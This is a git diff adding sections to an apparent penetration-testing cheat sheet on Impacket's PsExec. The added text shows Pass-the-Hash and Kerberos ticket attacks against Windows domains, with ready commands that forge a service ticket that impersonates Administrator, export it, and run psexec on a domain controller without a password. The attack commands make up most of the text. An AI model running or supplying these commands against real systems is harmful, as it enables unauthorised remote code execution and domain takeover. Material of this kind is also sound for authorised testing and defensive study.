@@ -26,6 +26,9 @@
 impacket-psexec <user>@<target_ip> 
 ```
 
+
+---
+
 ## Pass-the-Hash with PsExec
 Pass-the-Hash (PtH) is an attack technique that leverages NTLM hashes to authenticate against remote systems without requiring plaintext passwords. PsExec, particularly in implementations like Impacket’s `psexec.py`, allows executing commands remotely using this method, making it a powerful tool for penetration testing and post-exploitation.
 
@@ -41,3 +44,38 @@ Pass-the-Hash (PtH) is an attack technique that leverages NTLM hashes to authent
 ```bash
 python3 psexec.py Administrator@<target-ip> -hashes <NTLM_hash>
 ```
+
+
+
+---
+
+## TGS Authentication with PsExec
+With a valid **TGS** for a service (e.g., `cifs/dc.domain.local`), attackers can authenticate to remote systems without knowing the actual password.
+
+#### Workflow
+
+1. **Obtain a TGS for the target service**  
+Example with Impacket:
+
+```bash
+getST.py domain.local/GMSA_SVC$ -hashes :<NTLM_HASH> \
+  -spn cifs/dc.domain.local -impersonate Administrator -dc-ip <dc-ip>
+```
+
+This saves the ticket in a `.ccache` file.
+
+2. **Export the ticket to the environment**
+
+```bash
+export KRB5CCNAME=Administrator@cifs_dc.domain.local@DOMAIN.LOCAL.ccache
+```
+
+3. **Execute PsExec with Kerberos authentication**
+
+```bash
+python3 psexec.py Administrator@dc.domain.local -k -no-pass
+```
+
+- `-k` → use Kerberos authentication.
+- `-no-pass` → no password is supplied, only the ticket.
+- The tool reads the ticket from `KRB5CCNAME` and uses it for authentication.
